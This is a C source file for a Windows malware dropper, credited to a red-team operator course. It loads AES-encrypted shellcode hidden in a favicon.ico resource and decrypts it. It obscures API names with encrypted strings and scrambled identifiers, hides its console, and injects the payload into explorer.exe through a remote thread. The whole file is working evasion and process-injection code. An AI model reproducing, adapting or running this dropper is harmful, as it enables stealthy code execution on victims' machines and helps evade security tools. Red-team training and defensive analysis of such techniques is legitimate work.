/*
    Malware dropper created from the Red Team Operator Course
    Credit: reenz0h (twitter: @sektor7net)
    Author: m4ul3r

	This program reads in AES encrypted shellcode from favicon.ico, decrypts it
	with a hardcoded dIrVUaLMWedgcSf, and IKfyTGHShVaHGkes the tdWVMyfkvxJgrQW into explorer.exe
*/

/*
	Param Key:
		payload:		tdWVMyfkvxJgrQW
		payload_len:		tdWVMyfkvxJgrQW_len
		AESkey:			dIrVUaLMWedgcSf
		exec_mem:		lUxgKeTzxRlpUhR
	Func Key:
		AESDecrypt:		XNAsqfGGiaGZCZc
		FindTarget:		uNZmlqxpIMPqvvQ
		Inject:			IKfyTGHShVaHGke
		DecryptStrings:		VqtlIsiFXBgTSRA
		GetAddresses: 		BfaitLvZplIYFHB
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <psapi.h>
#include <tlhelp32.h>
#include "resources.h"
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// dIrVUaLMWedgcSf for decoding the favicon.ico tdWVMyfkvxJgrQW
char dIrVUaLMWedgcSf[] = { 0xe9, 0xa6, 0x1f, 0x6b, 0x3, 0x7e, 0xa4, 0xac, 0x4c, 0x14, 0x5e, 0x69, 0x7d, 0x61, 0x92, 0x60 };

/* pointer declarations for function obfuscation */
LPVOID (WINAPI *pVirtualAlloc) (
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
);

VOID (WINAPI *pRtlMoveMemory) (
	VOID UNALIGNED *Destination,
	VOID UNALIGNED *Source,
	SIZE_T         Length
);

HANDLE (WINAPI *pOpenProcess) (
	DWORD dwDesiredAccess,
	BOOL  bInheritHandle,
	DWORD dwProcessId
);

BOOL (WINAPI *pCloseHandle) (
	HANDLE hObject
);

FARPROC (WINAPI * pGetProcAddress) (
	HMODULE hModule,
	LPCSTR  lpProcName
);

LPVOID (WINAPI* pVirtualAllocEx) (
	HANDLE hProcess,
 	LPVOID lpAddress,
 	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
);

BOOL (WINAPI *pWriteProcessMemory) (
	HANDLE  hProcess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T  *lpNumberOfBytesWritten
);

HANDLE (WINAPI * pCreateRemoteThread) (
	HANDLE                 hProcess,
	LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	SIZE_T                 dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID                 lpParameter,
	DWORD                  dwCreationFlags,
	LPDWORD                lpThreadId
);

DWORD (WINAPI *pWaitForSingleObject) (
	HANDLE hHandle,
	DWORD  dwMilliseconds
);

HGLOBAL (WINAPI *pLoadResource) (
	HMODULE hModule,
	HRSRC   hResInfo
);

LPVOID (WINAPI *pLockResource) (
	HGLOBAL hResData
);

DWORD (WINAPI *pSizeofResource) (
	HMODULE hModule,
	HRSRC   hResInfo
);

HANDLE (WINAPI *pCreateToolhelp32Snapshot) (
	DWORD dwFlags,
	DWORD th32ProcessID
);

BOOL (WINAPI *pProcess32First) (
	HANDLE           hSnapshot,
	LPPROCESSENTRY32 lppe
);

BOOL (WINAPI *pProcess32Next) (
	HANDLE           hSnapshot,
	LPPROCESSENTRY32 lppe
);

int (WINAPI *plstrcmpiA) (
	LPCSTR lpString1,
	LPCSTR lpString2
);

HMODULE (WINAPI *pGetModuleHandleA) (
	LPCSTR lpModuleName
);

/* string obfuscation for the pointer */
unsigned char sExplorerexe[] = { 0x3a, 0xa0, 0x43, 0x25, 0xf2, 0x13, 0xad, 0xcc, 0xb7, 0x1e, 0x83, 0xbc, 0xaf, 0x96, 0x1, 0x6f };
unsigned char sKernel32dll[] = { 0xc0, 0x20, 0x64, 0xe0, 0xcf, 0xf4, 0x60, 0xc, 0x26, 0x57, 0x3f, 0x7e, 0x97, 0x2e, 0xc6, 0x67 };

unsigned char sVirtualAlloc[] = { 0x9d, 0xf7, 0x32, 0x6e, 0xe3, 0xb3, 0x1, 0xf2, 0x2d, 0x2, 0x80, 0x86, 0x5c, 0xde, 0x42, 0x5d };
unsigned char sRtlMoveMemory[] = { 0xb, 0x83, 0x21, 0x61, 0x3b, 0x2d, 0xd8, 0x85, 0xb, 0x90, 0x49, 0xb6, 0x40, 0x74, 0x5b, 0xea };
unsigned char sOpenProcess[] = { 0xdb, 0x66, 0x8, 0x14, 0x9a, 0x43, 0x6d, 0xda, 0xb6, 0x78, 0xc3, 0x75, 0x81, 0x15, 0x61, 0xb };
unsigned char sCloseHandle[] = { 0xb8, 0x71, 0xca, 0x53, 0x86, 0xc, 0xd9, 0xbb, 0xf3, 0x1f, 0xd3, 0xfc, 0x22, 0x6, 0xca, 0xa8 };
unsigned char sGetProcAddress[] = { 0xa9, 0x7c, 0x1c, 0x2b, 0xf8, 0xc7, 0x30, 0x2b, 0x55, 0xf3, 0x13, 0xfc, 0xc3, 0xe8, 0x25, 0x8e };
unsigned char sVirtualAllocEx[] = { 0x78, 0x92, 0xa8, 0x3a, 0xa8, 0x30, 0x4f, 0x5d, 0xf7, 0x56, 0x79, 0xf5, 0xb4, 0xb, 0xab, 0xa0 };
unsigned char sWriteProcessMemory[] = { 0x63, 0x61, 0xda, 0xd1, 0x3e, 0x98, 0x90, 0x53, 0xca, 0xa2, 0xf9, 0x3a, 0x46, 0xf1, 0xac, 0x2e, 0x8c, 0xe3, 0x5b, 0x96, 0x4e, 0x3c, 0x2e, 0xb8, 0xd3, 0xae, 0x9f, 0xfb, 0x72, 0x88, 0x97, 0x75 };
unsigned char sCreateRemoteThread[] = { 0xf7, 0x59, 0x1e, 0xa6, 0x1e, 0x4a, 0x65, 0x54, 0x73, 0x32, 0x6e, 0x25, 0x7b, 0xc6, 0x11, 0x0, 0xa5, 0xae, 0x1f, 0x6b, 0xd0, 0xcc, 0xc7, 0x1f, 0x91, 0x9f, 0xc8, 0x9, 0x87, 0x92, 0x61, 0x29 };
unsigned char sWaitForSingleObject[] = { 0x77, 0x53, 0xc8, 0x7b, 0x16, 0x8f, 0x47, 0x30, 0x78, 0x11, 0x71, 0xdd, 0x5d, 0xf7, 0x79, 0x61, 0xec, 0xda, 0x6e, 0x6e, 0x3e, 0xc5, 0xa5, 0x41, 0x5f, 0x8b, 0x21, 0xc5, 0x73, 0x6, 0x6d, 0x80 };
unsigned char sLoadResource[] = { 0x77, 0x93, 0xdd, 0x90, 0xe1, 0xca, 0x43, 0x62, 0x60, 0xaa, 0x35, 0xe7, 0x6a, 0x38, 0x7e, 0xa6 };
unsigned char sLockResource[] = { 0x98, 0xbc, 0xbf, 0x76, 0xc3, 0x14, 0x63, 0x21, 0x11, 0xcb, 0x4b, 0x2a, 0x42, 0x2a, 0x48, 0x84 };
unsigned char sSizeofResource[] = { 0x8, 0x71, 0xa6, 0x5e, 0xf5, 0x12, 0x1c, 0x73, 0x4b, 0x6, 0xf1, 0x13, 0xe9, 0xff, 0x76, 0x53 };
unsigned char sCreateToolhelp32Snapshot[] = { 0x5b, 0xf3, 0xa3, 0xaf, 0xf4, 0x80, 0x35, 0x69, 0xda, 0xf9, 0xf2, 0x27, 0xbe, 0x61, 0x88, 0x81, 0x11, 0xd5, 0x1a, 0xd3, 0x5c, 0xc9, 0x67, 0x54, 0x79, 0xc6, 0x8, 0x55, 0xdd, 0xa3, 0x2f, 0x45 };
unsigned char sProcess32First[] = { 0x95, 0xd2, 0x34, 0xd6, 0x6, 0xeb, 0xbc, 0xf6, 0x7d, 0xeb, 0x4f, 0x32, 0xef, 0xb6, 0xea, 0x83 };
unsigned char sProcess32Next[] = { 0x70, 0xd6, 0xab, 0x1b, 0x14, 0xdd, 0xcf, 0x41, 0x9f, 0xb4, 0x2b, 0xb6, 0xba, 0x8d, 0xe3, 0x22 };
unsigned char slstrcmpiA[] = { 0x16, 0xd, 0xe6, 0xea, 0x72, 0xe0, 0xe, 0x8d, 0x3f, 0x29, 0x70, 0x9c, 0x38, 0x9e, 0x9c, 0x74 };
unsigned char sGetModuleHandleA[] = { 0xd0, 0xff, 0x2a, 0xb3, 0x2b, 0x99, 0x9b, 0x23, 0x5d, 0xa8, 0x5b, 0xb8, 0x98, 0xd0, 0xcd, 0x87, 0x65, 0x79, 0x5a, 0x6f, 0x91, 0xf1, 0x42, 0xb9, 0x87, 0x36, 0x13, 0xb, 0xa1, 0x3e, 0x65, 0xcc };

/* AES keys for the string obfuscation */
unsigned char kExplorerexe[] = { 0x82, 0x87, 0x63, 0x33, 0x7d, 0x3a, 0xd7, 0x49, 0xa4, 0x6f, 0xff, 0x57, 0xfe, 0x55, 0xb5, 0x63 };
unsigned char kKernel32dll[] = { 0x3b, 0x25, 0xd, 0x45, 0x72, 0xc3, 0xd4, 0x4c, 0xd9, 0x14, 0x85, 0xb9, 0x40, 0x2b, 0x5, 0x78 };

unsigned char kVirtualAlloc[] = { 0x8, 0x71, 0xc9, 0x6b, 0x6b, 0x1b, 0xc0, 0x4e, 0x11, 0x8f, 0x22, 0x18, 0xb8, 0xc1, 0xe4, 0x56 };
unsigned char kRtlMoveMemory[] = { 0x63, 0xcf, 0x85, 0xd, 0x96, 0xc5, 0xad, 0x23, 0x6d, 0x0, 0x52, 0xc8, 0xcd, 0x5f, 0x7, 0xc5 };
unsigned char kOpenProcess[] = { 0xb4, 0xc1, 0x98, 0x5, 0x40, 0x15, 0x18, 0x4e, 0xb7, 0x6b, 0x61, 0x28, 0xac, 0x27, 0x15, 0x67 };
unsigned char kCloseHandle[] = { 0x82, 0xae, 0x68, 0x38, 0xee, 0xd9, 0x40, 0x65, 0x68, 0x28, 0x71, 0x31, 0xc4, 0xec, 0xb2, 0x46 };
unsigned char kGetProcAddress[] = { 0x4, 0x62, 0xe1, 0x0, 0x49, 0x6d, 0x4b, 0x28, 0xba, 0x14, 0x3b, 0x28, 0x65, 0x8f, 0x6c, 0x96 };
unsigned char kVirtualAllocEx[] = { 0x61, 0x8d, 0x8a, 0x6e, 0x7f, 0x69, 0x67, 0xe7, 0x39, 0xd, 0xb4, 0x9c, 0xc4, 0xd9, 0xfd, 0xaf };
unsigned char kWriteProcessMemory[] = { 0xb4, 0x9b, 0xc9, 0xad, 0x34, 0x48, 0x4f, 0xf6, 0xb, 0xa7, 0xaf, 0x79, 0x29, 0x42, 0xc4, 0xab };
unsigned char kCreateRemoteThread[] = { 0xe2, 0xb6, 0xed, 0x85, 0x1c, 0xef, 0x12, 0x6e, 0x34, 0xc4, 0x67, 0xad, 0x3b, 0xb6, 0xa5, 0x4 };
unsigned char kWaitForSingleObject[] = { 0x7d, 0x33, 0x62, 0x50, 0x58, 0x91, 0xc3, 0xdb, 0x7, 0xc9, 0xeb, 0xef, 0x20, 0x32, 0x7f, 0x38 };
unsigned char kLoadResource[] = { 0xa3, 0xe, 0xca, 0xc6, 0xb0, 0xb0, 0x5e, 0x3a, 0xfb, 0xdf, 0x2e, 0x3, 0x93, 0x1e, 0x3e, 0xca };
unsigned char kLockResource[] = { 0x69, 0xf6, 0xf5, 0x2b, 0x8e, 0xa7, 0x7d, 0x66, 0x53, 0x35, 0x72, 0x80, 0x15, 0x70, 0x1b, 0x50 };
unsigned char kSizeofResource[] = { 0xf9, 0x73, 0xe5, 0xc2, 0x58, 0xda, 0x74, 0xce, 0xf7, 0x75, 0x5c, 0x9f, 0x34, 0x21, 0x2, 0x62 };
unsigned char kCreateToolhelp32Snapshot[] = { 0x6e, 0xbc, 0xf8, 0xf1, 0x18, 0xe6, 0xa7, 0xe6, 0x7e, 0x87, 0xa9, 0xab, 0xf2, 0x3c, 0xcd, 0x4 };
unsigned char kProcess32First[] = { 0x5d, 0x8e, 0xf0, 0x98, 0x4d, 0x20, 0x41, 0x1b, 0x9a, 0x9, 0x71, 0xb1, 0x4b, 0x1b, 0xc6, 0xa3 };
unsigned char kProcess32Next[] = { 0xac, 0x94, 0x85, 0x74, 0xcd, 0x11, 0x4f, 0x30, 0xf7, 0x5d, 0xe8, 0x5b, 0xff, 0xd4, 0x8f, 0x30 };
unsigned char klstrcmpiA[] = { 0x67, 0x30, 0x3b, 0xab, 0x51, 0x40, 0xfc, 0xad, 0xc, 0xf8, 0x6c, 0x7e, 0x4a, 0x88, 0x9c, 0x62 };
unsigned char kGetModuleHandleA[] = { 0x55, 0x87, 0xf2, 0x7d, 0xa5, 0x72, 0x1b, 0xa7, 0xd0, 0x5c, 0x46, 0x30, 0xb0, 0x71, 0x82, 0x4b };

// malware functions
int XNAsqfGGiaGZCZc(char * tdWVMyfkvxJgrQW, unsigned int tdWVMyfkvxJgrQW_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, tdWVMyfkvxJgrQW, &tdWVMyfkvxJgrQW_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

int uNZmlqxpIMPqvvQ(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;

        // create a snapshot of all running processes        
        hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!pProcess32First(hProcSnap, &pe32)) {
                pCloseHandle(hProcSnap);
                return 0;
        }
        // iterate the snapshot    
        while (pProcess32Next(hProcSnap, &pe32)) {
                if (plstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        pCloseHandle(hProcSnap);
                
        return pid;
}

int IKfyTGHShVaHGke(HANDLE hProc, unsigned char * tdWVMyfkvxJgrQW, unsigned int tdWVMyfkvxJgrQW_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;

        // allocate memory buffer in remote process (hProc); return pointer to addr
        pRemoteCode = pVirtualAllocEx(hProc, NULL, tdWVMyfkvxJgrQW_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        // write tdWVMyfkvxJgrQW into buffer
        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)tdWVMyfkvxJgrQW, (SIZE_T)tdWVMyfkvxJgrQW_len, (SIZE_T *)NULL);
        
        // create a remote thread
        hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                pWaitForSingleObject(hThread, 500);
                pCloseHandle(hThread);
                return 0;
        }
        return -1;
}

void VqtlIsiFXBgTSRA() {
	// Decrypt function strings
	XNAsqfGGiaGZCZc((char *) sVirtualAlloc, sizeof(sVirtualAlloc), kVirtualAlloc, sizeof(kVirtualAlloc));
	XNAsqfGGiaGZCZc((char *) sRtlMoveMemory, sizeof(sRtlMoveMemory), kRtlMoveMemory, sizeof(kRtlMoveMemory));
	XNAsqfGGiaGZCZc((char *) sOpenProcess, sizeof(sOpenProcess), kOpenProcess, sizeof(kOpenProcess));
	XNAsqfGGiaGZCZc((char *) sCloseHandle, sizeof(sCloseHandle), kCloseHandle, sizeof(kCloseHandle));
	XNAsqfGGiaGZCZc((char *) sGetProcAddress, sizeof(sGetProcAddress), kGetProcAddress, sizeof(kGetProcAddress));
	XNAsqfGGiaGZCZc((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), kVirtualAllocEx, sizeof(kVirtualAllocEx));
	XNAsqfGGiaGZCZc((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), kWriteProcessMemory, sizeof(kWriteProcessMemory));
	XNAsqfGGiaGZCZc((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), kCreateRemoteThread, sizeof(kCreateRemoteThread));
	XNAsqfGGiaGZCZc((char *) sWaitForSingleObject, sizeof(sWaitForSingleObject), kWaitForSingleObject, sizeof(kWaitForSingleObject));
	XNAsqfGGiaGZCZc((char *) sLoadResource, sizeof(sLoadResource), kLoadResource, sizeof(kLoadResource));
	XNAsqfGGiaGZCZc((char *) sLockResource, sizeof(sLockResource), kLockResource, sizeof(kLockResource));
	XNAsqfGGiaGZCZc((char *) sSizeofResource, sizeof(sSizeofResource), kSizeofResource, sizeof(kSizeofResource));
	XNAsqfGGiaGZCZc((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), kCreateToolhelp32Snapshot, sizeof(kCreateToolhelp32Snapshot));
	XNAsqfGGiaGZCZc((char *) sProcess32First, sizeof(sProcess32First), kProcess32First, sizeof(kProcess32First));
	XNAsqfGGiaGZCZc((char *) sProcess32Next, sizeof(sProcess32Next), kProcess32Next, sizeof(kProcess32Next));
	XNAsqfGGiaGZCZc((char *) slstrcmpiA, sizeof(slstrcmpiA), klstrcmpiA, sizeof(klstrcmpiA));
	XNAsqfGGiaGZCZc((char *) sGetModuleHandleA, sizeof(sGetModuleHandleA), kGetModuleHandleA, sizeof(kGetModuleHandleA));

	// Decrypt strings
	XNAsqfGGiaGZCZc((char *) sExplorerexe, sizeof(sExplorerexe), kExplorerexe, sizeof(kExplorerexe));
	XNAsqfGGiaGZCZc((char *) sKernel32dll, sizeof(sKernel32dll), kKernel32dll, sizeof(kKernel32dll));
}

void BfaitLvZplIYFHB() {
	pGetProcAddress = GetProcAddress(GetModuleHandle(sKernel32dll), sGetProcAddress);
	pGetModuleHandleA = pGetProcAddress(GetModuleHandle(sKernel32dll), sGetModuleHandleA);
	pVirtualAlloc = pGetProcAddress(pGetModuleHandleA(sKernel32dll), sVirtualAlloc);
	pRtlMoveMemory = pGetProcAddress(pGetModuleHandleA(sKernel32dll), sRtlMoveMemory);
	pOpenProcess = pGetProcAddress(pGetModuleHandleA(sKernel32dll), sOpenProcess);
	pCloseHandle = pGetProcAddress(pGetModuleHandleA(sKernel32dll), sCloseHandle);
	pVirtualAllocEx = pGetProcAddress(pGetModuleHandleA(sKernel32dll), sVirtualAllocEx);
	pWriteProcessMemory = pGetProcAddress(pGetModuleHandleA(sKernel32dll), sWriteProcessMemory);
	pCreateRemoteThread = pGetProcAddress(pGetModuleHandleA(sKernel32dll), sCreateRemoteThread);
	pWaitForSingleObject = pGetProcAddress(pGetModuleHandleA(sKernel32dll), sWaitForSingleObject);
	pLoadResource = pGetProcAddress(pGetModuleHandleA(sKernel32dll), sLoadResource);
	pLockResource = pGetProcAddress(pGetModuleHandleA(sKernel32dll), sLockResource);
	pSizeofResource = pGetProcAddress(pGetModuleHandleA(sKernel32dll), sSizeofResource);
	pCreateToolhelp32Snapshot = pGetProcAddress(pGetModuleHandleA(sKernel32dll), sCreateToolhelp32Snapshot);
	pProcess32First = pGetProcAddress(pGetModuleHandleA(sKernel32dll), sProcess32First);
	pProcess32Next = pGetProcAddress(pGetModuleHandleA(sKernel32dll), sProcess32Next);
	plstrcmpiA = pGetProcAddress(pGetModuleHandleA(sKernel32dll), slstrcmpiA);
}

// main
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
	void * lUxgKeTzxRlpUhR;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	int pid = 0;
	HANDLE hProc = NULL;
	
	unsigned char * tdWVMyfkvxJgrQW;
	unsigned int tdWVMyfkvxJgrQW_len;
    
	// hide cmd
	FreeConsole();

	// do decryption of strings and resolve address pointers
	VqtlIsiFXBgTSRA();
	BfaitLvZplIYFHB();
    
	// Extract tdWVMyfkvxJgrQW from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = pLoadResource(NULL, res);
	tdWVMyfkvxJgrQW = (char *) pLockResource(resHandle);					// returns addr to our tdWVMyfkvxJgrQW
	tdWVMyfkvxJgrQW_len = pSizeofResource(NULL, res);					// returns size of our tdWVMyfkvxJgrQW
	
	// Allocate some memory buffer for tdWVMyfkvxJgrQW
	lUxgKeTzxRlpUhR = pVirtualAlloc(0, tdWVMyfkvxJgrQW_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy tdWVMyfkvxJgrQW to new memory buffer
	pRtlMoveMemory(lUxgKeTzxRlpUhR, tdWVMyfkvxJgrQW, tdWVMyfkvxJgrQW_len);

    // Decrypt the tdWVMyfkvxJgrQW
    XNAsqfGGiaGZCZc((char *) lUxgKeTzxRlpUhR, tdWVMyfkvxJgrQW_len, dIrVUaLMWedgcSf, sizeof(dIrVUaLMWedgcSf));

	// find pid of exeplorer
	pid = uNZmlqxpIMPqvvQ(sExplorerexe);

	if (pid) {
		// try to open target process; return a handle to process
		hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		
        // IKfyTGHShVaHGke into the target process
		if (hProc != NULL) {
			IKfyTGHShVaHGke(hProc, lUxgKeTzxRlpUhR, tdWVMyfkvxJgrQW_len);
			pCloseHandle(hProc);
		}
	}

	return 0;
}
